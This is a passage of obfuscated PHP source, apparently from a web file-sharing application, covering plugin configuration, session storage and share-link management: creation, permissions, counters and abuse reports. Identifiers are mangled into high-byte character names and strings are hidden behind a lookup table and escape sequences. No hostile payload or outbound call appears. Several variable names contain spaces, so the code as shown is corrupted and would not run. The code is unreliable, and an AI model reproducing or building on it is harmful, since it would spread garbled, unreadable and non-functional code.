= $this->loadList($ƒíª°£â); if ($ñ½¥¯¶ && is_array($ñ½¥¯¶[$ê–¿ôÁñ[6]])) { $®Õ‚–ä® = $ñ½¥¯¶[$ê–¿ôÁñ[6]]; } if (!$®Õ‚–ä® || $ÁÅ½²Í) { $®Õ‚–ä® = $this->getConfigDefault($ƒíª°£â); } return $®Õ‚–ä®; } public function setConfig($Å„œÛ¤°, $Ä¬¥¾ˆ£ = false) { $Î‡¤¯¢ú =& $_SERVER[íû‘ş´]; $À‰ÕúÍ« = $this->loadList($Å„œÛ¤°); if (!$À‰ÕúÍ«) { return !1; } $ƒ§‹ó = $À‰ÕúÍ«[$Î‡¤¯¢ú[6]]; if ($Ä¬¥¾ˆ£ == !1) { $ƒ§‹ó = array(); $Ä¬¥¾ˆ£ = $this->getConfigDefault($Å„œÛ¤°); } foreach ($Ä¬¥¾ˆ£ as $áÇïÒô€ => $‡’ş„ñŞ) { $ƒ§‹ó[$áÇïÒô€] = is_string($‡’ş„ñŞ) ? trim($‡’ş„ñŞ) : $‡’ş„ñŞ; } $this->update($À‰ÕúÍ«[$Î‡¤¯¢ú[443]], array($Î‡¤¯¢ú[6] => $ƒ§‹ó)); } public function viewList() { $Ç”é»Ø =& $_SERVER[íû‘ş´]; $º¾ñ«Ì = $this->loadList(); $this->pluginScan($º¾ñ«Ì); $º¾ñ«Ì = $this->loadPluginList(); $õô”‚Ïç = array(); foreach ($º¾ñ«Ì as $¢œÑáøÓ => $êÔ¸šÁù) { unset($êÔ¸šÁù[$Ç”é»Ø[2024]], $êÔ¸šÁù[$Ç”é»Ø[6]]); $úÌ„Â±ß = PLUGIN_DIR . $êÔ¸šÁù[$Ç”é»Ø[32]] . $Ç”é»Ø[2026]; if (!is_file($úÌ„Â±ß)) { continue; } $•¹í®Á‰ = Hook::apply($êÔ¸šÁù[$Ç”é»Ø[32]] . $Ç”é»Ø[2034]); if (is_array($•¹í®Á‰)) { $õô”‚Ïç[$¢œÑáøÓ] = array_merge($êÔ¸šÁù, $•¹í®Á‰); } } return $õô”‚Ïç; } private function loadPluginList() { $’Ùâå¤Ø =& $_SERVER[íû‘ş´]; $„¯¯ûùâ = $this->loadList(); if (strtolower(MOD) == $’Ùâå¤Ø[2035]) { return $„¯¯ûùâ; } $—ÄøŞ¾Õ = Hook::trigger($’Ùâå¤Ø[2036], $„¯¯ûùâ); if ($„¯¯ûùâ && !$—ÄøŞ¾Õ) { die; } return $—ÄøŞ¾Õ ? $—ÄøŞ¾Õ : $„¯¯ûùâ; } private function pluginScan($…½ˆÃ¾) { $›­ˆû¯¸ =& $_SERVER[íû‘ş´]; recursion_dir(PLUGIN_DIR, $üãşÓÙÙ, $Â©õÅÛ‰, 0); foreach ($üãşÓÙÙ as $Éâ¬íîÍ) { $Ô³¹—ğ = get_path_this($Éâ¬íîÍ); if (isset($…½ˆÃ¾[$Ô³¹—ğ]) || !file_exists($Éâ¬íîÍ . $›­ˆû¯¸[2037]) || !file_exists($Éâ¬íîÍ . $›­ˆû¯¸[2026])) { continue; } Hook::apply($Ô³¹—ğ . $›­ˆû¯¸[2031]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\164\145\155\x5f\163\x65\x73\x73\x69\x6f\156"; public function get($–“Ïî¤ø) { $ä°³İ±ô =& $_SERVER[íû‘ş´]; $“‰×ëîê = $this->where(array($ä°³İ±ô[2038] => $–“Ïî¤ø))->find(); if (!is_array($“‰×ëîê)) { return !1; } return $“‰×ëîê[$ä°³İ±ô[813]]; } public function set($¦Ÿá™¼Ò, $Ÿ¬Ûº÷½, $º×œÖ•» = 3600) { $Ó¨Üòšç =& $_SERVER[íû‘ş´]; $´ñú¾æú = array($Ó¨Üòšç[2038] => $¦Ÿá™¼Ò, $Ó¨Üòšç[1942] => $Ÿ¬Ûº÷½, $Ó¨Üòšç[2039] => $º×œÖ•» + time()); if (Session::get($Ó¨Üòšç[2040])) { $´ñú¾æú[$Ó¨Üòšç[1705]] = Session::get($Ó¨Üòšç[2040]); } else { $´ñú¾æú[$Ó¨Üòšç[1705]] = 0; } if ($this->get($¦Ÿá™¼Ò)) { return $this->where(array($Ó¨Üòšç[2038] => $¦Ÿá™¼Ò))->save($´ñú¾æú); } else { return $this->add($´ñú¾æú, array(), !0); } } public function remove($øñ—¼©) { return $this->where(array($_SERVER[íû‘ş´][2038] => $øñ—¼©))->delete(); } public function clearTimeout() { return $this->where($_SERVER[íû‘ş´][2041] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\162\x65"; protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\x79\x54\x69\x6d\x65", "\x74\151\155\x65", "\x69\156\x73\x65\162\x74\54\x75\160\144\x61\x74\145", "\146\165\x6e\143\164\151\x6f\156"), array("\x63\162\145\x61\164\x65\124\151\155\x65", "\x74\151\155\145", "\x69\156\x73\145\x72\164", "\x66\165\156\143\164\x69\x6f\x6e"), array("\157\160\164\x69\157\x6e\163", '', "\151\156\x73\x65\x72\164\x2c\165\x70\144\x61\164\x65\x2c\163\x65\x6c\145\x63\x74", "\152\x73\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($³øÈÁú’) { $œĞêÁÌ¸ =& $_SERVER[íû‘ş´]; $Á™²¬— = isset($³øÈÁú’[0]) ? $³øÈÁú’[0] : !1; return array($œĞêÁÌ¸[2042] => array(USER_ID, $œĞêÁÌ¸[2043]), $œĞêÁÌ¸[1983] => array($Á™²¬—, $œĞêÁÌ¸[2044])); } protected function listSimple() { $–ù¼º†¿ = array($_SERVER[íû‘ş´][1705] => USER_ID); $ßá†Û¨» = $this->field($this->fieldList)->where($–ù¼º†¿)->select(); return $ßá†Û¨» ? $ßá†Û¨» : array(); } protected function getInfo($Ñ–‚ƒ­Í, $ÈÃ™Í½¶ = false) { $€³è¥ï­ =& $_SERVER[íû‘ş´]; if ($ÈÃ™Í½¶) { return $this->_getShareInfo(array($€³è¥ï­[643] => $Ñ–‚ƒ­Í)); } $çé»Äœ = $this->cacheFunctionGet($€³è¥ï­[1985], $Ñ–‚ƒ­Í); return $çé»Äœ; } public function getInfoByHash($ì—šé„–) { return $this->_getShareInfo(array($_SERVER[íû‘ş´][2045] => $ì—šé„–)); } public function getInfoByPath($Ú‰éÅ”Ş) { $‚á¶Ö‰ =& $_SERVER[íû‘ş´]; $–éñÅßü = array($‚á¶Ö‰[1705] => USER_ID, $‚á¶Ö‰[181] => $Ú‰éÅ”Ş); return $this->_getShareInfo($–éñÅßü); } public function getInfoBySourcePath($İ±Èº‘Å) { $òø¨ƒ˜Æ =& $_SERVER[íû‘ş´]; $êõ—Ï¸ğ = array($òø¨ƒ˜Æ[1705] => USER_ID, $òø¨ƒ˜Æ[1233] => $İ±Èº‘Å); return $this->_getShareInfo($êõ—Ï¸ğ); } private function _getShareInfo($ãâ¬²æ) { $ÔìÂ´ü =& $_SERVER[íû‘ş´]; $úíºÓù¢ = $this->where($ãâ¬²æ)->find(); if (!$úíºÓù¢) { return !1; } $ãâ¬²æ = array($ÔìÂ´ü[643] => $úíºÓù¢[$ÔìÂ´ü[643]]); $ã¯„úä = $ÔìÂ´ü[2046]; $Êâå¢ª = Model($ÔìÂ´ü[644])->order($ÔìÂ´ü[443])->field($ã¯„úä)->where($ãâ¬²æ)->select(); if ($úíºÓù¢[$ÔìÂ´ü[181]] == $ÔìÂ´ü[212]) { $úíºÓù¢[$ÔìÂ´ü[87]] = IO::info($úíºÓù¢[$ÔìÂ´ü[1233]]); } else { $úíºÓù¢[$ÔìÂ´ü[87]] = Model($ÔìÂ´ü[1390])->pathInfo($úíºÓù¢[$ÔìÂ´ü[181]]); } $úíºÓù¢[$ÔìÂ´ü[2047]] = $Êâå¢ª; return $úíºÓù¢; } protected function getInfoAuth($½ÚÌ©¬) { $Õ„½é™ü =& $_SERVER[íû‘ş´]; $¾Ñ”ò¬³ = $this->getInfo($½ÚÌ©¬); if ($¾Ñ”ò¬³[$Õ„½é™ü[1705]] == USER_ID) { $¾Ñ”ò¬³[$Õ„½é™ü[464]] = $¾Ñ”ò¬³[$Õ„½é™ü[87]][$Õ„½é™ü[464]]; } else { $¾Ñ”ò¬³[$Õ„½é™ü[464]] = Model($Õ„½é™ü[545])->authMake($¾Ñ”ò¬³[$Õ„½é™ü[2047]]); } return $¾Ñ”ò¬³; } protected function listData($è‹­®À = null, $£Ë±«¬à = 300) { $‹Ì‚Ú‚ =& $_SERVER[íû‘ş´]; $ì‰§÷õ = array(array($‹Ì‚Ú‚[540] => array($‹Ì‚Ú‚[1070], 0), $‹Ì‚Ú‚[641] => array($‹Ì‚Ú‚[1070], 0), $‹Ì‚Ú‚[2048] => $‹Ì‚Ú‚[2001])); if ($è‹­®À == $‹Ì‚Ú‚[2049]) { $ì‰§÷õ = array($‹Ì‚Ú‚[540] => 1); } else { if ($è‹­®À == $‹Ì‚Ú‚[1219]) { $ì‰§÷õ = array($‹Ì‚Ú‚[641] => 1); } } $ì‰§÷õ[$‹Ì‚Ú‚[1705]] = USER_ID; $›å³¢¯Š = $this->where($ì‰§÷õ)->selectPage($£Ë±«¬à); return $›å³¢¯Š; } protected function listToMe($û­Ñ×£¶ = 300) { $—ÓìÌ°± =& $_SERVER[íû‘ş´]; $×¬Ãêë÷ = Model($—ÓìÌ°±[2050])->userGroupParents(USER_ID); $Éßà´÷É = array($—ÓìÌ°±[626] => SourceModel::TYPE_USER, $—ÓìÌ°±[548] => USER_ID); if ($×¬Ãêë÷) { $Éßà´÷É = array(array($—ÓìÌ°±[626] => SourceModel::TYPE_USER, $—ÓìÌ°±[548] => USER_ID), array($—ÓìÌ°±[626] => SourceModel::TYPE_GROUP, $—ÓìÌ°±[548] => array($—ÓìÌ°±[7], $×¬Ãêë÷)), $—ÓìÌ°±[2048] => $—ÓìÌ°±[2001]); } $î¸®É£õ = Model($—ÓìÌ°±[644])->where($Éßà´÷É)->selectPage($û­Ñ×£¶); $ß¼©ú›ø = array_to_keyvalue_group($î¸®É£õ[$—ÓìÌ°±[413]], $—ÓìÌ°±[643]); if (!$ß¼©ú›ø) { return $î¸®É£õ; } $ÎÎ°óéÙ = $—ÓìÌ°±[2051]; $Éßà´÷É = array($—ÓìÌ°±[643] => array($—ÓìÌ°±[469], array_keys($ß¼©ú›ø)), $—ÓìÌ°±[1705] => array($—ÓìÌ°±[1072], $—ÓìÌ°±[212])); $ºËì¶İÜ = $this->field($ÎÎ°óéÙ)->where($Éßà´÷É)->select(); foreach ($ºËì¶İÜ as $§ôÙ ˜ù => &$¨šÔû¼) { $¨šÔû¼[$—ÓìÌ°±[2047]] = $ß¼©ú›ø[$¨šÔû¼[$—ÓìÌ°±[643]]]; } unset($¨šÔû¼); $ŒùĞ‘•ä = array($—ÓìÌ°±[2052] => $ºËì¶İÜ, $—ÓìÌ°±[2053] => $î¸®É£õ[$—ÓìÌ°±[410]]); return $ŒùĞ‘•ä; } protected function shareAdd($Áü†‰Á, $¢Æ½ŸÔ¨) { $ÉÌ•á³İ =& $_SERVER[íû‘ş´]; $ÅÁä‚ªŸ = $this->_addShareData($Áü†‰Á, $¢Æ½ŸÔ¨); if (!empty($¢Æ½ŸÔ¨[$ÉÌ•á³İ[2054]])) { $this->_shareAuthSet($ÅÁä‚ªŸ, $¢Æ½ŸÔ¨[$ÉÌ•á³İ[2054]]); } $this->shareEventAdd($Áü†‰Á, $¢Æ½ŸÔ¨, $ÉÌ•á³İ[2055]); return $ÅÁä‚ªŸ; } protected function shareAddSystem($–Æ–¬ØË, $Œ—ÖÃ­) { $Äˆ€†Ù =& $_SERVER[íû‘ş´]; $úù ‡Ú = $this->_addShareData($–Æ–¬ØË, $Œ—ÖÃ­, $Äˆ€†Ù[179]); $this->_shareAuthSet($úù ‡Ú, $Œ—ÖÃ­[$Äˆ€†Ù[2054]]); return $úù ‡Ú; } private function shareEventAdd($ìŒñºÂ, $‚‡¢ÇÊ, $ÚÂ³‚ÓŸ = "\141\144\144") { $€€»íéá =& $_SERVER[íû‘ş´]; if (!$ìŒñºÂ || $ìŒñºÂ == $€€»íéá[212]) { return; } if ($ÚÂ³‚ÓŸ == $€€»íéá[2055]) { if ($‚‡¢ÇÊ[$€€»íéá[540]] == $€€»íéá[88]) { Model($€€»íéá[611])->eventShare($ìŒñºÂ, $€€»íéá[2056]); } if ($‚‡¢ÇÊ[$€€»íéá[641]] == $€€»íéá[88]) { Model($€€»íéá[611])->eventShare($ìŒñºÂ, $€€»íéá[2057]); } return; } $ «Ò²ÑÖ = $this->getInfoByPath($ìŒñºÂ); $íĞÇ– = $€€»íéá[2058]; if ($ «Ò²ÑÖ[$€€»íéá[540]] == $€€»íéá[212] && $‚‡¢ÇÊ[$€€»íéá[540]] == $€€»íéá[88]) { $íĞÇ– = $€€»íéá[2056]; } if ($ «Ò²ÑÖ[$€€»íéá[540]] == $€€»íéá[88] && $‚‡¢ÇÊ[$€€»íéá[540]] == $€€»íéá[212]) { $íĞÇ– = $€€»íéá[2059]; } if ($ «Ò²ÑÖ[$€€»íéá[641]] == $€€»íéá[212] && $‚‡¢ÇÊ[$€€»íéá[641]] == $€€»íéá[88]) { $íĞÇ– = $€€»íéá[2057]; } if ($ «Ò²ÑÖ[$€€»íéá[641]] == $€€»íéá[88] && $‚‡¢ÇÊ[$€€»íéá[641]] == $€€»íéá[212]) { $íĞÇ– = $€€»íéá[2060]; } Model($€€»íéá[611])->eventShare($ìŒñºÂ, $íĞÇ–); return; } private function _addShareData($şşœïª–, $„äø˜ñ = array(), $®Šİ”äñ = false) { $ßÜ«Ïó =& $_SERVER[íû‘ş´]; $øÎ¾êÄ = $®Šİ”äñ == $ßÜ«Ïó[179] ? 0 : USER_ID; $òÈĞæ»œ = array($ßÜ«Ïó[468] => $şşœïª–, $ßÜ«Ïó[1696] => $øÎ¾êÄ); if ($şşœïª– == 0) { $òÈĞæ»œ = array($ßÜ«Ïó[2061] => $„äø˜ñ[$ßÜ«Ïó[1233]], $ßÜ«Ïó[1696] => $øÎ¾êÄ); } if ($£›¬÷Í˜ = $this->where($òÈĞæ»œ)->find()) { return $£›¬÷Í˜[$ßÜ«Ïó[643]]; } if ($şşœïª– == 0) { $ÏŠƒº¦ = array($ßÜ«Ïó[32] => get_path_this($„äø˜ñ[$ßÜ«Ïó[84]])); } else { $ÏŠƒº¦ = Model($ßÜ«Ïó[884])->sourceInfo($şşœïª–); if (!$ÏŠƒº¦) { return !1; } } if (!$„äø˜ñ[$ßÜ«Ïó[1599]]) { $„äø˜ñ[$ßÜ«Ïó[1599]] = $ÏŠƒº¦[$ßÜ«Ïó[32]]; } $ˆ˜é¦ = array($ßÜ«Ïó[1696] => $øÎ¾êÄ, $ßÜ«Ïó[468] => $şşœïª–, $ßÜ«Ïó[1599] => $ßÜ«Ïó[12], $ßÜ«Ïó[540] => 0, $ßÜ«Ïó[641] => 0, $ßÜ«Ïó[1233] => $ßÜ«Ïó[12], $ßÜ«Ïó[351] => $ßÜ«Ïó[12], $ßÜ«Ïó[947] => $ßÜ«Ïó[12], $ßÜ«Ïó[2062] => 0, $ßÜ«Ïó[2063] => 0, $ßÜ«Ïó[820] => 0, $ßÜ«Ïó[2064] => $ßÜ«Ïó[12], $ßÜ«Ïó[2045] => $ßÜ«Ïó[12]); $º‰‰¶÷¤ = explode($ßÜ«Ïó[50], $ßÜ«Ïó[2065]); foreach ($º‰‰¶÷¤ as $øÏØÌ) { if (!isset($„äø˜ñ[$øÏØÌ])) { continue; } $ˆ˜é¦[$øÏØÌ] = $„äø˜ñ[$øÏØÌ]; } $è–”€¯ = $this->add($ˆ˜é¦); $Âñ„®¸ = array($ßÜ«Ïó[2045] => short_id($è–”€¯)); $this->where(array($ßÜ«Ïó[2066] => $è–”€¯))->save($Âñ„®¸); return $è–”€¯; } private function _shareAuthSet($ØÅ¼£öÓ, $šÈ·á£É) { $îËš‘—º =& $_SERVER[íû‘ş´]; if (!is_array($šÈ·á£É)) { return !1; } $şŠŞ’ŞØ = Model($îËš‘—º[2011]); $şŠŞ’ŞØ->where(array($îËš‘—º[643] => $ØÅ¼£öÓ))->delete(); $”ÓÚ”õ‰ = array(); foreach ($šÈ·á£É as $Ó—Ù´İÎ) { $Ùõ¿ÍçÈ = SourceModel::TYPE_USER; if ($Ó—Ù´İÎ[$îËš‘—º[178]] == SourceModel::TYPE_GROUP) { $Ùõ¿ÍçÈ = SourceModel::TYPE_GROUP; } $×Ò¥Ÿı… = array($îËš‘—º[643] => $ØÅ¼£öÓ, $îËš‘—º[178] => $Ùõ¿ÍçÈ, $îËš‘—º[548] => intval($Ó—Ù´İÎ[$îËš‘—º[548]]), $îËš‘—º[2007] => 0, $îËš‘—º[2067] => -1); if ($Ó—Ù´İÎ[$îËš‘—º[2007]]) { $×Ò¥Ÿı…[$îËš‘—º[2007]] = $Ó—Ù´İÎ[$îËš‘—º[2007]]; } else { if ($Ó—Ù´İÎ[$îËš‘—º[2067]]) { $×Ò¥Ÿı…[$îËš‘—º[2067]] = $Ó—Ù´İÎ[$îËš‘—º[2067]]; } } $”ÓÚ”õ‰[] = $×Ò¥Ÿı…; } return $şŠŞ’ŞØ->addAll($”ÓÚ”õ‰, array(), !0); } public function numViewAdd($Æ£âã¨í) { $ú ÁœÉğ =& $_SERVER[íû‘ş´]; $ÕÖËŠ³ = array($ú ÁœÉğ[2066] => $Æ£âã¨í); $this->where($ÕÖËŠ³)->setAdd($ú ÁœÉğ[2062]); } public function numDownloadAdd($üğ™úÁ) { $ÃáŠš¡¶ =& $_SERVER[íû‘ş´]; $æ° °Ù = array($ÃáŠš¡¶[2066] => $üğ™úÁ); $this->where($æ° °Ù)->setAdd($ÃáŠš¡¶[2063]); } protected function shareEdit($¼ôÅÑ­ì, $©É®ş²) { $Ÿ¨¥×Ø =& $_SERVER[íû‘ş´]; $œ†è´ = $this->getInfo($¼ôÅÑ­ì); if (!$œ†è´) { return !1; } $this->_checkLinkShare($©É®ş², $œ†è´); $µÑÂÑ€ = array(); $´¶…†‡ü = explode($Ÿ¨¥×Ø[50], $Ÿ¨¥×Ø[2068]); foreach ($´¶…†‡ü as $¦ûï¿ÊÂ) { if (!array_key_exists($¦ûï¿ÊÂ, $©É®ş²)) { continue; } $µÑÂÑ€[$¦ûï¿ÊÂ] = $©É®ş²[$¦ûï¿ÊÂ]; } $this->shareEventAdd($œ†è´[$Ÿ¨¥×Ø[181]], $©É®ş², $Ÿ¨¥×Ø[1873]); $this->where(array($Ÿ¨¥×Ø[2066] => $¼ôÅÑ­ì))->save($µÑÂÑ€); if (isset($©É®ş²[$Ÿ¨¥×Ø[2054]])) { $this->_shareAuthSet($¼ôÅÑ­ì, $©É®ş²[$Ÿ¨¥×Ø[2054]]); } return !0; } private function _checkLinkShare($Åƒâ¯°, $¬Ú×·˜¢) { $“öó§Ê¢ =& $_SERVER[íû‘ş´]; if ($Åƒâ¯°[$“öó§Ê¢[540]] != $“öó§Ê¢[88]) { return; } $¦œëıó¯ = $¬Ú×·˜¢[$“öó§Ê¢[87]][$“öó§Ê¢[181]]; if ($¬Ú×·˜¢[$“öó§Ê¢[87]][$“öó§Ê¢[33]] != $“öó§Ê¢[214]) { $ß˜¶¨¼Ç = $this->_folderReport($¦œëıó¯); if (!$ß˜¶¨¼Ç) { return; } show_json(LNG($“öó§Ê¢[2069]) . $“öó§Ê¢[2070] . $ß˜¶¨¼Ç, !1); } $²²÷ïß = Model($“öó§Ê¢[884])->fileInfoGet($¬Ú×·˜¢[$“öó§Ê¢[87]][$“öó§Ê¢[181]]); if (!$²²÷ïß) { return; } $Ùõ®çü = $this->shareFileMeta($²²÷ïß[$“öó§Ê¢[518]]); if (isset($Ùõ®çü[$“öó§Ê¢[418]]) && $Ùõ®çü[$“öó§Ê¢[418]] == $“öó§Ê¢[88]) { show_json(LNG($“öó§Ê¢[2071]), !1); } } private function _folderReport($şÀƒ±Ñ) { $Ñ”ì· ³ =& $_SERVER[íû‘ş´]; $–ƒ™î§â = array($Ñ”ì· ³[518] => array($Ñ”ì· ³[1070], 0), $Ñ”ì· ³[809] => 3); $òºåå¶Á = Model($Ñ”ì· ³[2072])->where($–ƒ™î§â)->field($Ñ”ì· ³[518])->select(); if (!$òºåå¶Á) { return !1; } $òºåå¶Á = array_to_keyvalue($òºåå¶Á, $Ñ”ì· ³[12], $Ñ”ì· ³[518]); $ãşŸËî = $Ñ”ì· ³[50] . $şÀƒ±Ñ . $Ñ”ì· ³[50]; $–ƒ™î§â = array($Ñ”ì· ³[518] => array($Ñ”ì· ³[7], $òºåå¶Á), $Ñ”ì· ³[563] => array($Ñ”ì· ³[427], "\45{$ãşŸËî}\x25"), $Ñ”ì· ³[482] => 0); $Ø…‘¢È = Model($Ñ”ì· ³[884])->where($–ƒ™î§â)->field($Ñ”ì· ³[2073])->find(); if (!$Ø…‘¢È) { return !1; } $‚‡ñ·ß­ = substr($Ø…‘¢È[$Ñ”ì· ³[563]], strpos($Ø…‘¢È[$Ñ”ì· ³[563]], $ãşŸËî)); $–ƒ™î§â = array($Ñ”ì· ³[181] => array($Ñ”ì· ³[7], trim($‚‡ñ·ß­, $Ñ”ì· ³[50]))); $Ï¨¨Œ½¿ = Model($Ñ”ì· ³[884])->where($–ƒ™î§â)->field($Ñ”ì· ³[32])->select(); $ËŒÃáÆ† = array_to_keyvalue($Ï¨¨Œ½¿, $Ñ”ì· ³[12], $Ñ”ì· ³[32]); $ËŒÃáÆ†[] = $Ø…‘¢È[$Ñ”ì· ³[32]]; return implode($Ñ”ì· ³[8], $ËŒÃáÆ†); } protected function remove($ÙÁæäÖñ) { $¾ßÂ•ñó =& $_SERVER[íû‘ş´]; if (is_array($ÙÁæäÖñ)) { $ÙÁæäÖñ = array($¾ßÂ•ñó[7], $ÙÁæäÖñ); } $Å¦Ç´ø£ = array($¾ßÂ•ñó[643] => $ÙÁæäÖñ); $Š£“Æ Ñ = $this->where($Å¦Ç´ø£)->delete(); if ($Š£“Æ Ñ) { Model($¾ßÂ•ñó[644])->where(array($¾ßÂ•ñó[643] => $ÙÁæäÖñ))->delete(); } $€ééÑŞ• = is_array($ÙÁæäÖñ) ? $ÙÁæäÖñ[1] : array($ÙÁæäÖñ); for ($·Š³µ„é = 0; $·Š³µ„é < count($€ééÑŞ•); $·Š³µ„é++) { $¬“òäãÔ = $this->getInfo($€ééÑŞ•[$·Š³µ„é]); if ($¬“òäãÔ[$¾ßÂ•ñó[641]] == $¾ßÂ•ñó[88]) { Model($¾ßÂ•ñó[611])->eventShare($¬“òäãÔ[$¾ßÂ•ñó[181]], $¾ßÂ•ñó[2060]); } if ($¬“òäãÔ[$¾ßÂ•ñó[540]] == $¾ßÂ•ñó[88]) { Model($¾ßÂ•ñó[611])->eventShare($¬“òäãÔ[$¾ßÂ•ñó[181]], $¾ßÂ•ñó[2059]); } } return $Š£“Æ Ñ; } protected function removeBySource($ÑÃ²¼¼î) { $¦¡Òˆ–“ =& $_SERVER[íû‘ş´]; $µ«¾†ö = array($¦¡Òˆ–“[468] => array($¦¡Òˆ–“[469], $ÑÃ²¼¼î)); $‚Ğˆê¥Ë = $this->field($¦¡Òˆ–“[643])->where($µ«¾†ö)->select(); $‚Ğˆê¥Ë = array_to_keyvalue($‚Ğˆê¥Ë, $¦¡Òˆ–“[12], $¦¡Òˆ–“[643]); if (!$‚Ğˆê¥Ë) { return; } $µ«¾†ö = array($¦¡Òˆ–“[2066] => array($¦¡Òˆ–“[469], $‚Ğˆê¥Ë)); $this->where($µ«¾†ö)->delete(); Model($¦¡Òˆ–“[644])->where($µ«¾†ö)->delete(); } public function listAll($ÉöÂÚ£) { $Üµ”·ıì =& $_SERVER[íû‘ş´]; $ÍƒÜõÎâ = array(); if ($ÉöÂÚ£[$Üµ”·ıì[1705]]) { $ÍƒÜõÎâ[$Üµ”·ıì[1705]] = $ÉöÂÚ£[$Üµ”·ıì[1705]]; } if ($ÉöÂÚ£[$Üµ”·ıì[819]]) { $  œ‰­ = $ÉöÂÚ£[$Üµ”·ıì[820]] ? $ÉöÂÚ£[$Üµ”·ıì[820]] : strtotime(date($Üµ”·ıì[2074])); $ÍƒÜõÎâ[$Üµ”·ıì[215]] = array($Üµ”·ıì[377], array($ÉöÂÚ£[$Üµ”·ıì[819]], $  œ‰­)); } if ($ÉöÂÚ£[$Üµ”·ıì[33]]) { $ÍƒÜõÎâ[$ÉöÂÚ£[$Üµ”·ıì[33]]] = 1; } else { $ÍƒÜõÎâ[] = array($Üµ”·ıì[540] => array($Üµ”·ıì[1070], 0), $Üµ”·ıì[641] => array($Üµ”·ıì[1070], 0), $Üµ”·ıì[2048] => $Üµ”·ıì[2001]); } if ($ÉöÂÚ£[$Üµ”·ıì[1997]]) { $ÍƒÜõÎâ[] = array($Üµ”·ıì[2045] => $ÉöÂÚ£[$Üµ”·ıì[1997]], $Üµ”·ıì[1599] => array($Üµ”·ıì[427], "\45{$ÉöÂÚ£[$Üµ”·ıì[1997]]}\45"), $Üµ”·ıì[2048] => $Üµ”·ıì[2001]); } $€²ºµ¨± = $this->_makeOrder()->where($ÍƒÜõÎâ)->selectPage(20); if (empty($€²ºµ¨±[$Üµ”·ıì[413]])) { return array(); } $this->_listDataApply($€²ºµ¨±[$Üµ”·ıì[413]]); return $€²ºµ¨±; } public function listDataApply($Üì¬Òú») { $this->_listDataApply($Üì¬Òú»); return $Üì¬Òú»; } private function _listDataApply(&$ÇŠ£åßë) { $ß½ş¢ =& $_SERVER[íû‘ş´]; $ÏáæœÔŞ = array_to_keyvalue($ÇŠ£åßë, $ß½ş¢[12], $ß½ş¢[1705]); $¼—åô„“ = Model($ß½ş¢[577])->userListInfo(array_unique($ÏáæœÔŞ)); $›ıÉáµµ = array_to_keyvalue($ÇŠ£åßë, $ß½ş¢[12], $ß½ş¢[181]); $³Öİ¤şô = Model($ß½ş¢[884])->sourceListInfo($›ıÉáµµ, !0); foreach ($ÇŠ£åßë as $ÉÀ¡ª¯ô => &$Äßªù‘—) { $öÓœÒã = $Äßªù‘—[$ß½ş¢[1705]]; $Äßªù‘—[$ß½ş¢[2075]] = $¼—åô„“[$öÓœÒã] ? $¼—åô„“[$öÓœÒã] : !1; $şíšç»Ö = $Äßªù‘—[$ß½ş¢[181]]; $Äßªù‘—[$ß½ş¢[87]] = $³Öİ¤şô[$şíšç»Ö] ? $³Öİ¤şô[$şíšç»Ö] : !1; if ($Äßªù‘—[$ß½ş¢[87]][$ß½ş¢[482]] == $ß½ş¢[88]) { unset($ÇŠ£åßë[$ÉÀ¡ª¯ô]); } if ($Äßªù‘—[$ß½ş¢[87]] != $ß½ş¢[212] && !$Äßªù‘—[$ß½ş¢[87]]) { unset($ÇŠ£åßë[$ÉÀ¡ª¯ô]); } } unset($Äßªù‘—); $ÇŠ£åßë = array_values($ÇŠ£åßë); } private function _makeOrder($±÷çÑÀì = '') { $à¨”»ß =& $_SERVER[íû‘ş´]; $ˆµ‡šâË = array($à¨”»ß[215], $à¨”»ß[820], $à¨”»ß[2062], $à¨”»ß[2063]); $µ ÍÊÚõ = array($à¨”»ß[500] => $à¨”»ß[501], $à¨”»ß[502] => $à¨”»ß[503]); $…•›ÜÉì = Input::get($à¨”»ß[507], $à¨”»ß[7], $à¨”»ß[474], $ˆµ‡šâË); $¸”Ã‰Õ— = Input::get($à¨”»ß[508], $à¨”»ß[7], $à¨”»ß[2076], array($à¨”»ß[1994], $à¨”»ß[502])); $¸”Ã‰Õ— = $µ ÍÊÚõ[$¸”Ã‰Õ—]; $±÷çÑÀì = $±÷çÑÀì . "{$…•›ÜÉì}\40{$¸”Ã‰Õ—}"; return $this->order($±÷çÑÀì); } public function reportAdd($ãšİë©Å) { $íàóöá =& $_SERVER[íû‘ş´]; $ïá‘âä = array($íàóöá[643] => $ãšİë©Å[$íàóöá[643]], $íàóöá[1705] => USER_ID); if (Model($íàóöá[2072])->where($ïá‘âä)->find()) { return !1; } $€ù¸´¥Ñ = array($íàóöá[643] => $ãšİë©Å[$íàóöá[643]], $íàóöá[1599] => $ãšİë©Å[$íàóöá[1599]], $íàóöá[181] => $ãšİë©Å[$íàóöá[181]], $íàóöá[518] => $ãšİë©Å[$íàóöá[518]], $íàóöá[1705] => USER_ID, $íàóöá[33] => $ãšİë©Å[$íàóöá[33]], $íàóöá[503] => $ãšİë©Å[$íàóöá[503]]); return Model($íàóöá[2072])->add($€ù¸´¥Ñ); } public function reportList($Ÿ±ùÍŒ) { $£úÛÊÔæ =& $_SERVER[íû‘ş´]; $µÊì³‚ë = array(); if ($Ÿ±ùÍŒ[$£úÛÊÔæ[819]]) { $©ğÕ™êİ = $Ÿ±ùÍŒ[$£úÛÊÔæ[820]] ? $Ÿ±ùÍŒ[$£úÛÊÔæ[820]] : strtotime(date($£úÛÊÔæ[2074])); $µÊì³‚ë[$£úÛÊÔæ[215]] = array($£úÛÊÔæ[377], array($Ÿ±ùÍŒ[$£úÛÊÔæ[819]], $©ğÕ™êİ)); } if (isset($Ÿ±ùÍŒ[$£úÛÊÔæ[33]]) && in_array($Ÿ±ùÍŒ[$£úÛÊÔæ[33]], array($£úÛÊÔæ[88], $£úÛÊÔæ[487], $£úÛÊÔæ[2077], $£úÛÊÔæ[2078], $£úÛÊÔæ[2079]))) { $µÊì³‚ë[$£úÛÊÔæ[33]] = $Ÿ±ùÍŒ[$£úÛÊÔæ[33]]; } if (isset($Ÿ±ùÍŒ[$£úÛÊÔæ[809]]) && in_array($Ÿ±ùÍŒ[$£úÛÊÔæ[809]], array($£úÛÊÔæ[212], $£úÛÊÔæ[88], $£úÛÊÔæ[487], $£úÛÊÔæ[2077]))) { $µÊì³‚ë[$£úÛÊÔæ[809]] = 